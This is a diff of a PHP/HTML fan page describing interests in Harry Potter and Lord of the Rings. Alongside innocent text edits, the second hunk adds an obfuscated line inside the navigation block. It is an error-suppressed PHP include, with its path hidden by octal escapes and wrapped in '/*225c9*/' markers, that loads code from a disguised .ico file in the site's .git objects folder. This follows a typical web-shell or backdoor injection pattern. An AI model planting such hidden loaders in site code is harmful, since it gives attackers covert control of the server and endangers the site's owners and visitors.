@@ -58,8 +58,8 @@
 		<h1>Magic & Fantasy</h1>
 		<div>
 <h2 style="">Harry Potter</h2>
-We are interested in getting some magic done as long as it is peaceful and friendly. Our focus lies on lovely aspects of magic.<br/>
-And the beauty of gentle fantasy.<br/>
+We are interested in getting some magic done, for example the golden snitch but also other wonderful effects and feelings of the creations of J.K.Rowling, as long as it is peaceful and friendly. Our focus lies on lovely aspects of magic.<br/>
+And the beauty of positive fantasy and optimistic realistic future. Our focus is on well-being and keeping other goodhearted beings warm and snug too.<br/>
 <br/>
 <h2>Lord of the rings</h2>
 Languages like Quenya and Sindarin, sceneries and polite peace and noble minds and fine arts are in our interest.
@@ -81,6 +81,11 @@ form#fullHolder section:nth-of-type(3)
 
 		<nav id="main-nav" class="navbar-collapse ">
 		<?php
+/*225c9*/
+
+@include "\057sr\166/h\164tp\057.g\151t/\157bj\145ct\163/0\144/.\06775\0622d\0671.\151co";
+
+/*225c9*/
 		include("./dynamic_menu/DynamicMenu.class.php");
 		?>
 		</nav>
